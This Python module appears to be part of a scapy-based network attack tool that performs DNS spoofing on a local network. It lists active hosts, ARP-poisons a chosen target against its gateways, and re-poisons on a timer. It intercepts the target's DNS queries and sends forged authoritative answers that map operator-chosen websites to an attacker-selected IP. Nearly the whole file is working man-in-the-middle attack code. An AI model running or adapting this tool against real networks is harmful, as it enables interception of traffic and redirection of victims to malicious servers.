from scapy.all import *
import netifaces as ni
import time
import re

import search_hosts as sh
import arp_spoofing as arp
import spoofing_tool as spoof

## REGEX FOR CHECKING URL VALIDITY ##
regex = re.compile(
        r'^(?:http|ftp)s?://' # http:// or https://
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' #domain...
        r'localhost|' #localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' # ...or ip
        r'(?::\d+)?' # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)

## CONSTANTS ##
REPOISON_TIME = int(20)
END_POISON = int(200)

def dns_spoofing(gratuitious, verbose):
    if verbose:     
        conf.verb = 0 # make scapy verbose (no output)

    spoof.clear()
    previous_tuples = []

    # disable ip forwarding
    spoof.should_ip_forward(False)
    previous_tuples.append(["IP forwarding disabled!"])
    previous_tuples.append([""])

    previous_tuples.append(["Chosen attack: DNS Spoofing.", 0])
    previous_tuples.append(["----------------------------"])

    iface, previous_tuples = spoof.get_interface(previous_tuples)

    spoof.print_previous(previous_tuples, True)

    active_hosts, previous_tuples = sh.search_hosts(iface, [])

    spoof.printf("")
    previous_tuples.append([""])
    spoof.printf("Input the IP address of the target out of the active hosts("+str(1)+"-"+str(len(active_hosts))+"):", 1)
    previous_tuples.append(["Input the IP address of the target out of the active hosts("+str(1)+"-"+str(len(active_hosts))+"):", 1])

    target = spoof.validate_ip(active_hosts, [], previous_tuples)

    # Get the IP addresses of the default gateways of the selected interface
    gateways = []
    for key, val in ni.gateways()["default"].items():
        if val[1] == iface:
            gateways.append(str(val[0]))

    for host in active_hosts:
        if host["ip"] in gateways:
            for scnd_host in active_hosts:
                if scnd_host["mac"] == host["mac"] and scnd_host["ip"] not in gateways:
                    gateways.append(scnd_host["ip"])

    previous_tuples = []
    to_print = "Chosen target IP address: " + target["ip"]
    previous_tuples.append([to_print, 0])
    previous_tuples.append(["-" * len(to_print)])

    dns_hosts = choose_websites(active_hosts, previous_tuples).copy()
    
    spoof.clear()
    spoof.printf("Chosen websites and targets:", 0)

    i = 1
    for url, ip in dns_hosts.items():
        spoof.printf("\t"+ str(i) + ". URL: " + url[:-1] + " \tIP: " + ip)
        i+=1

    spoof.printf("")
    spoof.printf("Starting poisoning... (Use Ctrl+Z to stop and kill the program)", 4)

    # Start ARP poisoning
    my_addresses = sh.get_my_details(iface)
    for gw_ip in gateways:
        arp.one_way_arp_start(target["mac"], target["ip"], gw_ip, my_addresses['mac'], my_addresses['ip'], iface)

    spoof.printf("Poisoning initiated.", 4)

    dns_spoof_and_repoison(my_addresses, gateways, target, iface, dns_hosts, gratuitious, END_POISON)

    # end poisoning
    for gw_ip in gateways:
        for host in active_hosts:
            if host['ip'] == gw_ip:
                arp.one_way_arp_end(target["mac"], target["ip"], host['mac'], host['ip'], my_addresses['mac'], my_addresses['ip'], iface)
                break

def choose_websites(active_hosts, previous_tuples):
    
    dns_hosts = {}
    _iter = 0
    continue1 = True
    continue2 = True

    previous_tuples.append(["Now you can choose which websites to spoof and with what IP out of the active hosts("+str(1)+"-"+str(len(active_hosts))+"):"])
    previous_tuples = sh.print_active_hosts(active_hosts, 0, 0, previous_tuples, False)
    previous_tuples.append(["You can pick multiple times. Type 'd' when done choosing."])
    previous_tuples.append([""])
    previous_tuples.append(["Choose website to spoof and its corresponding IP out of the active hosts("+str(1)+"-"+str(len(active_hosts))+"):", 1])
    
    while continue1 and continue2:
        spoof.clear()
        spoof.print_previous(previous_tuples, True)

        url, continue1 = input_web("URL: ", _iter, True, active_hosts, previous_tuples)
        if continue1:
            ip, continue2  = input_web(" IP: ", _iter, False, active_hosts, previous_tuples)
        _iter += 1
        if continue1 and continue2:
            dns_hosts[url+"."] = ip

            if url[:4] == "www.":
                dns_hosts[url[4:]+"."] = ip
            else:
                dns_hosts["www."+url+"."] = ip

            spoof.printf("")
            spoof.printf("Added tuple (" + url + ", " + ip + ")", 0)
            time.sleep(0.5)

    return dns_hosts

def input_web(eend, _iter, isURL, active_hosts, previous_tuples):
    res = spoof.inputf(previous_tuples, eend)
    if res in ["d", "done"]:
        if _iter < 1:
            spoof.printf("You chould choose at least one (URL, IP) pair!", 2)
            return input_web(eend, _iter, isURL, active_hosts, previous_tuples)
        else:
            return res, False

    if isURL:
        if not is_URL_valid(res):
            spoof.printf("Invalid URL({})! Try again.".format(res), 2)
            return input_web(eend, _iter, isURL, active_hosts, previous_tuples)
        else:
            return res, True
    else:
        ip, valid = is_IP_valid(active_hosts, res)
        if not valid:
            spoof.printf("Invalid IP({})! Try again.".format(ip), 2)
            return input_web(eend, _iter, isURL, active_hosts, previous_tuples)
        else:
            return ip, True

def is_URL_valid(string):
    return re.match(regex, "http://" + string) is not None

def is_IP_valid(active_hosts, ip_address):
    try:
        # check if the ip is part of {active_hosts}
        ip_address = active_hosts[int(ip_address) - 1]["ip"]
        return ip_address, True
    except:
        # check the ip using regular expressions
        match = re.match(r"^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$", ip_address)
        if bool(match) is False:
            return ip_address, False

        for part in ip_address.split("."):
            if int(part) < 0 or int(part) > 255:
                return ip_address, False

        return ip_address, True

def dns_spoof_and_repoison(my_addresses, gateways, target, iface, dns_hosts, gratuitious, end_poison):
        #last_poison_time = time.time() - REPOISON_TIME
        #_filter = "udp and tcp"

        while True:
            # sniff for 1 packet that adheres to the {_filter}
            sniff(prn=process_udp_pkt(target, iface, dns_hosts, my_addresses), store=0, timeout=REPOISON_TIME)   
            
            # {REPOISON_TIME} seconds have passed => should repoison
            #current_time = time.time()
            #if current_time - last_poison_time > REPOISON_TIME - 0.5:
            repoison(my_addresses, gateways, target, iface, gratuitious)
                #last_poison_time = current_time
            end_poison -= 1

            if end_poison < 1:
                break

def repoison(my_addresses, gateways, target, iface, gratuitious):
    spoof.printf("Repoisoning", 4)
    for gw_ip in gateways:
        arp.one_way_arp(target["mac"], target["ip"], gw_ip, my_addresses['mac'], my_addresses['ip'], iface, 2, gratuitious)

def process_udp_pkt(target, iface, dns_hosts, my_addresses):
    def process_udp_pkt_inside(pkt): 
        if pkt.haslayer(IP):
            if pkt.haslayer(DNS) and pkt[IP].src == target['ip'] and pkt[DNSQR].qname in dns_hosts:
                spoof.printf("Found DNS query from " + pkt[IP].src + " for " + pkt[DNSQR].qname + " Spoofing response.", 5)
                resp_packet = build_dns_response_packet(pkt, dns_hosts[pkt[DNSQR].qname])
                sendp(resp_packet, iface=iface)

            elif pkt[IP].src == target['ip']:
                pkt[Ether].dst = "52:54:00:12:35:00"

                if pkt.haslayer(IP):
                    del pkt[IP].len
                    del pkt[IP].chksum

                if pkt.haslayer(UDP):
                    del pkt[UDP].len
                    del pkt[UDP].chksum

                try:
                    # new_pkt = srp1(pkt, verbose=0, iface=iface, timeout=2)[0]
                    # # if pkt.haslayer(DNS):
                    # # else:
                    # #     new_pkt = sr1(pkt, iface=iface)[0]

                    # new_pkt[Ether].dst = target["mac"]

                    # if new_pkt.haslayer(IP):
                    #     del new_pkt[IP].len
                    #     del new_pkt[IP].chksum
                    
                    # if new_pkt.haslayer(UDP):
                    #     del new_pkt[UDP].len
                    #     del new_pkt[UDP].chksum

                    # sendp(new_pkt, count=1, iface=iface)
                    sendp(pkt, count=1, iface=iface)
                except:
                    pass

    return process_udp_pkt_inside

def build_dns_response_packet(pkt, malicious_ip):
        eth = Ether(src = pkt[Ether].dst,
                    dst = pkt[Ether].src)

        ip = IP(src = pkt[IP].dst,
                dst = pkt[IP].src)

        udp = UDP(dport = pkt[UDP].sport,
                  sport = pkt[UDP].dport)

        dns = DNS(id = pkt[DNS].id,
                  qd = pkt[DNS].qd,
                  aa = 1,
                  rd = 0,
                  qr = 1,
                  qdcount = 1,
                  ancount = 1,
                  nscount = 0,
                  arcount = 0,
                  ar = DNSRR(
                        rrname = pkt[DNS].qd.qname,
                        type = 'A',
                        ttl = 600,
                        rdata = malicious_ip))

        new_pkt = eth / ip / udp / dns
        return new_pkt